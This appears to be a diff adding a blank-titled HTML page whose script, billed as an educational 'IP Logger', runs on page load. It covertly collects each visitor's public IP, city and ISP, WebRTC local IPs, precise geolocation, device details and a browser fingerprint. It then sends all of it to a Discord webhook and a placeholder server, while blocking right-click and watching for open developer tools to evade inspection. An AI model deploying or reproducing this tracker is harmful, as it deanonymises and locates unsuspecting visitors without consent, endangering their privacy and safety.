@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>*{margin:0;padding:0;}</style>
+</head>
+<body>
+
+<script>
+// IP Logger - Educational Cybersecurity Project
+(async function() {
+    // CONFIGURATION
+    const CONFIG = {
+        webhook: 'YOUR_DISCORD_WEBHOOK_URL_HERE',
+        collectAll: true, // Collect extensive data
+        stealthMode: true,
+        sendScreenshot: false, // Option to send screenshot
+        sendPingback: true, // Send confirmation back to server
+        trackingId: Math.random().toString(36).substring(7) // Unique tracking ID
+    };
+
+    // Data collection object
+    const collectedData = {
+        trackingId: CONFIG.trackingId,
+        timestamp: new Date().toISOString(),
+        ipInfo: {},
+        networkInfo: {},
+        deviceInfo: {},
+        browserInfo: {},
+        fingerprint: {},
+        additionalData: {}
+    };
+
+    // Start collection
+    await collectAllData();
+    
+    // Send to Discord
+    await sendToDiscord();
+    
+    // Optional pingback
+    if (CONFIG.sendPingback) {
+        await sendPingback();
+    }
+
+    // Data collection functions
+    async function collectAllData() {
+        await collectIPInfo();
+        collectNetworkInfo();
+        collectDeviceInfo();
+        collectBrowserInfo();
+        generateFingerprint();
+        collectAdditionalData();
+        
+        // Try to get precise location if permission available
+        await tryGeolocation();
+        
+        // Try to get local IP addresses (WebRTC leak)
+        await getLocalIPs();
+    }
+
+    // Get public IP and geolocation
+    async function collectIPInfo() {
+        // Try multiple IP detection services
+        const services = [
+            'https://api.ipify.org?format=json',
+            'https://api64.ipify.org?format=json',
+            'https://ipapi.co/json/',
+            'https://ipinfo.io/json',
+            'https://geolocation-db.com/json/'
+        ];
+
+        for (const service of services) {
+            try {
+                const response = await fetch(service);
+                const data = await response.json();
+                
+                collectedData.ipInfo = {
+                    ...collectedData.ipInfo,
+                    ...data,
+                    service: service
+                };
+                
+                // If we got basic IP, break
+                if (data.ip || data.IPv4) break;
+            } catch (error) {
+                continue;
+            }
+        }
+    }
+
+    // Collect network information
+    function collectNetworkInfo() {
+        if (navigator.connection) {
+            collectedData.networkInfo = {
+                type: navigator.connection.type,
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData,
+                onchange: navigator.connection.onchange ? 'yes' : 'no'
+            };
+        }
+        
+        // Try to detect VPN/Proxy
+        collectedData.networkInfo.vpnIndicators = {
+            timezoneMismatch: false,
+            languageMismatch: false,
+            screenResolution: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        };
+    }
+
+    // Collect device information
+    function collectDeviceInfo() {
+        collectedData.deviceInfo = {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            doNotTrack: navigator.doNotTrack,
+            
+            // Screen details
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type
+            },
+            
+            // Window details
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            },
+            
+            // Timezone
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            
+            // Date formatting
+            locale: Intl.DateTimeFormat().resolvedOptions().locale,
+            
+            // Performance
+            performance: {
+                memory: performance.memory ? {
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: performance.memory.usedJSHeapSize
+                } : null,
+                timing: performance.timing ? {
+                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
+                } : null
+            }
+        };
+    }
+
+    // Collect browser-specific information
+    function collectBrowserInfo() {
+        collectedData.browserInfo = {
+            cookiesEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled(),
+            online: navigator.onLine,
+            
+            // Storage
+            localStorage: !!window.localStorage,
+            sessionStorage: !!window.sessionStorage,
+            indexedDB: !!window.indexedDB,
+            
+            // APIs available
+            webgl: isWebGLAvailable(),
+            webrtc: isWebRTCAvailable(),
+            websockets: 'WebSocket' in window,
+            serviceWorker: 'serviceWorker' in navigator,
+            notification: 'Notification' in window,
+            geolocation: 'geolocation' in navigator,
+            mediaDevices: 'mediaDevices' in navigator,
+            
+            // Browser features
+            canvas: isCanvasAvailable(),
+            fonts: getFonts(),
+            plugins: getPlugins(),
+            mimeTypes: getMimeTypes()
+        };
+    }
+
+    // Generate browser fingerprint
+    function generateFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // Canvas fingerprint
+        let canvasPrint = 'canvas_not_available';
+        if (ctx) {
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('FINGERPRINT', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('FINGERPRINT', 4, 17);
+            
+            canvasPrint = canvas.toDataURL();
+        }
+        
+        collectedData.fingerprint = {
+            canvas: canvasPrint.substring(0, 100) + '...',
+            webgl: getWebGLFingerprint(),
+            fontsHash: hashString(collectedData.browserInfo.fonts.join(',')),
+            pluginsHash: hashString(collectedData.browserInfo.plugins.join(',')),
+            screenHash: hashString(`${screen.width}x${screen.height}:${screen.colorDepth}`),
+            timezoneHash: hashString(collectedData.deviceInfo.timezone),
+            languageHash: hashString(navigator.language)
+        };
+        
+        // Generate overall fingerprint hash
+        const fingerprintString = Object.values(collectedData.fingerprint).join('');
+        collectedData.fingerprint.overall = hashString(fingerprintString);
+    }
+
+    // Collect additional data
+    function collectAdditionalData() {
+        // Referrer
+        collectedData.additionalData.referrer = document.referrer;
+        
+        // URL parameters
+        const params = new URLSearchParams(window.location.search);
+        collectedData.additionalData.urlParams = Object.fromEntries(params);
+        
+        // Page URL
+        collectedData.additionalData.url = window.location.href;
+        
+        // Session information
+        collectedData.additionalData.session = {
+            loadTime: new Date().getTime() - performance.timing.navigationStart,
+            pageVisits: getPageVisitCount(),
+            firstVisit: getFirstVisit()
+        };
+        
+        // Mouse movement tracking (basic)
+        collectedData.additionalData.interaction = {
+            mouseMoves: 0,
+            clicks: 0,
+            scrolls: 0,
+            keypresses: 0
+        };
+        
+        // Start tracking interactions
+        startInteractionTracking();
+    }
+
+    // Try to get precise geolocation
+    async function tryGeolocation() {
+        if ('geolocation' in navigator) {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+                
+                collectedData.ipInfo.geolocation = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed
+                };
+            } catch (error) {
+                collectedData.ipInfo.geolocationError = error.message;
+            }
+        }
+    }
+
+    // Get local IPs via WebRTC
+    async function getLocalIPs() {
+        try {
+            const pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            pc.onicecandidate = (ice) => {
+                if (!ice.candidate) return;
+                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if (ip) {
+                    if (!collectedData.networkInfo.localIPs) {
+                        collectedData.networkInfo.localIPs = [];
+                    }
+                    if (!collectedData.networkInfo.localIPs.includes(ip[1])) {
+                        collectedData.networkInfo.localIPs.push(ip[1]);
+                    }
+                }
+            };
+            
+            setTimeout(() => pc.close(), 1000);
+        } catch (error) {
+            // WebRTC not available or blocked
+        }
+    }
+
+    // Helper functions
+    function isWebGLAvailable() {
+        try {
+            const canvas = document.createElement('canvas');
+            return !!(window.WebGLRenderingContext && 
+                     (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+        } catch (e) {
+            return false;
+        }
+    }
+
+    function isWebRTCAvailable() {
+        return !!(window.RTCPeerConnection || window.mozRTCPeerConnection || 
+                 window.webkitRTCPeerConnection);
+    }
+
+    function isCanvasAvailable() {
+        const canvas = document.createElement('canvas');
+        return !!(canvas.getContext && canvas.getContext('2d'));
+    }
+
+    function getFonts() {
+        const fonts = [
+            'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+            'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+            'Verdana', 'Webdings', 'Wingdings', 'MS Sans Serif',
+            'MS Serif', 'Cambria', 'Calibri', 'Consolas'
+        ];
+        
+        const available = [];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        if (ctx) {
+            fonts.forEach(font => {
+                ctx.font = '72px monospace';
+                const baseline = ctx.measureText('mmmmmmmmmm').width;
+                ctx.font = `72px ${font}, monospace`;
+                if (ctx.measureText('mmmmmmmmmm').width !== baseline) {
+                    available.push(font);
+                }
+            });
+        }
+        
+        return available;
+    }
+
+    function getPlugins() {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        return plugins;
+    }
+
+    function getMimeTypes() {
+        const mimeTypes = [];
+        for (let i = 0; i < navigator.mimeTypes.length; i++) {
+            mimeTypes.push(navigator.mimeTypes[i].type);
+        }
+        return mimeTypes;
+    }
+
+    function getWebGLFingerprint() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'webgl_not_available';
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            return {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            };
+        }
+        return 'webgl_no_debug_info';
+    }
+
+    function hashString(str) {
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+            const char = str.charCodeAt(i);
+            hash = ((hash << 5) - hash) + char;
+            hash = hash & hash;
+        }
+        return Math.abs(hash).toString(16);
+    }
+
+    function getPageVisitCount() {
+        let count = localStorage.getItem('visitCount') || 0;
+        count = parseInt(count) + 1;
+        localStorage.setItem('visitCount', count);
+        return count;
+    }
+
+    function getFirstVisit() {
+        let firstVisit = localStorage.getItem('firstVisit');
+        if (!firstVisit) {
+            firstVisit = new Date().toISOString();
+            localStorage.setItem('firstVisit', firstVisit);
+        }
+        return firstVisit;
+    }
+
+    function startInteractionTracking() {
+        document.addEventListener('mousemove', () => {
+            collectedData.additionalData.interaction.mouseMoves++;
+        });
+        
+        document.addEventListener('click', () => {
+            collectedData.additionalData.interaction.clicks++;
+        });
+        
+        document.addEventListener('scroll', () => {
+            collectedData.additionalData.interaction.scrolls++;
+        });
+        
+        document.addEventListener('keypress', () => {
+            collectedData.additionalData.interaction.keypresses++;
+        });
+    }
+
+    // Send data to Discord
+    async function sendToDiscord() {
+        if (!CONFIG.webhook.includes('discord.com')) {
+            console.log('No valid Discord webhook configured');
+            return;
+        }
+
+        try {
+            // Format message
+            let message = `🌐 **HappyIP Logger** 😀\n`;
+            message += `**Tracking ID:** ${collectedData.trackingId}\n`;
+            message += `**Timestamp:** ${new Date(collectedData.timestamp).toLocaleString()}\n\n`;
+            
+            // IP Information
+            if (collectedData.ipInfo.ip || collectedData.ipInfo.IPv4) {
+                const ip = collectedData.ipInfo.ip || collectedData.ipInfo.IPv4;
+                message += `**🌍 Public IP:** \`${ip}\`\n`;
+                
+                if (collectedData.ipInfo.city) message += `**🏙️ City:** ${collectedData.ipInfo.city}\n`;
+                if (collectedData.ipInfo.region) message += `**📍 Region:** ${collectedData.ipInfo.region}\n`;
+                if (collectedData.ipInfo.country) message += `**🇺🇳 Country:** ${collectedData.ipInfo.country}\n`;
+                if (collectedData.ipInfo.org) message += `**🏢 ISP:** ${collectedData.ipInfo.org}\n`;
+            } else {
+                message += `**❌ IP Detection:** Failed (might be using VPN/Proxy)\n`;
+            }
+            
+            // Local IPs
+            if (collectedData.networkInfo.localIPs && collectedData.networkInfo.localIPs.length > 0) {
+                message += `**🔒 Local IPs:** ${collectedData.networkInfo.localIPs.join(', ')}\n`;
+            }
+            
+            // Device Info
+            message += `\n**📱 Device:** ${collectedData.deviceInfo.platform}\n`;
+            message += `**🖥️ Screen:** ${collectedData.deviceInfo.screen.width}x${collectedData.deviceInfo.screen.height}\n`;
+            message += `**🌐 Browser:** ${collectedData.deviceInfo.userAgent.split(' ')[0]}\n`;
+            message += `**🗣️ Language:** ${collectedData.deviceInfo.language}\n`;
+            message += `**⏰ Timezone:** ${collectedData.deviceInfo.timezone}\n`;
+            
+            // Network
+            if (collectedData.networkInfo.effectiveType) {
+                message += `**📶 Connection:** ${collectedData.networkInfo.effectiveType}\n`;
+            }
+            
+            // Referrer
+            if (collectedData.additionalData.referrer) {
+                message += `**🔗 Referrer:** ${collectedData.additionalData.referrer.substring(0, 50)}...\n`;
+            }
+            
+            // Fingerprint
+            message += `\n**🔍 Fingerprint:** ${collectedData.fingerprint.overall.substring(0, 12)}...\n`;
+            
+            // Send first message
+            await fetch(CONFIG.webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message })
+            });
+            
+            // Send detailed data as file
+            const jsonData = JSON.stringify(collectedData, null, 2);
+            const blob = new Blob([jsonData], { type: 'application/json' });
+            const formData = new FormData();
+            formData.append('content', `📊 Full data for ${collectedData.trackingId}`);
+            formData.append('file', blob, `ip_log_${collectedData.trackingId}.json`);
+            
+            await fetch(CONFIG.webhook, {
+                method: 'POST',
+                body: formData
+            });
+            
+            console.log(`✅ IP data sent to Discord (Tracking ID: ${collectedData.trackingId})`);
+            
+        } catch (error) {
+            console.error('❌ Failed to send to Discord:', error);
+            
+            // Fallback: minimal data
+            try {
+                const minimalData = {
+                    ip: collectedData.ipInfo.ip || collectedData.ipInfo.IPv4 || 'unknown',
+                    trackingId: collectedData.trackingId,
+                    timestamp: collectedData.timestamp
+                };
+                
+                await fetch(CONFIG.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🌐 HappyIP Logger 😀\nIP: ${minimalData.ip}\nTracking ID: ${minimalData.trackingId}`
+                    })
+                });
+            } catch (e) {
+                // Final failure
+            }
+        }
+    }
+
+    // Optional: Send pingback to your server
+    async function sendPingback() {
+        try {
+            // Replace with your endpoint
+            const endpoint = 'https://your-server.com/log';
+            await fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    trackingId: collectedData.trackingId,
+                    timestamp: collectedData.timestamp,
+                    ip: collectedData.ipInfo.ip || collectedData.ipInfo.IPv4
+                }),
+                mode: 'no-cors' // Don't wait for response
+            });
+        } catch (error) {
+            // Silent fail
+        }
+    }
+
+    // Stealth features
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    
+    // Basic anti-debugging
+    const devToolsCheck = setInterval(() => {
+        const threshold = 160;
+        const widthDiff = window.outerWidth - window.innerWidth > threshold;
+        const heightDiff = window.outerHeight - window.innerHeight > threshold;
+        
+        if (widthDiff || heightDiff) {
+            // Dev tools might be open
+            clearInterval(devToolsCheck);
+            // Don't do anything obvious, just stop further execution
+            throw new Error('Debugging detected');
+        }
+    }, 1000);
+
+    // Clean up after 5 minutes
+    setTimeout(() => {
+        clearInterval(devToolsCheck);
+    }, 300000);
+
+})();
+</script>
+
+</body>
+</html>
